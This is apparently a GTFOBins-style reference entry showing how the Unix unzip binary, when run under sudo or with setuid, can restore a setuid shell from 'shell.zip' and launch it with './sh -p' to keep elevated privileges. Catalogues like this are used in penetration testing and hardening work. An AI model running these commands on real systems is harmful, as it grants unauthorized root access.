---
type: gtfobin
name: unzip
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# unzip

## privilege-escalation

```bash
unzip -K shell.zip
./sh -p
```
**Contexts:** sudo, suid
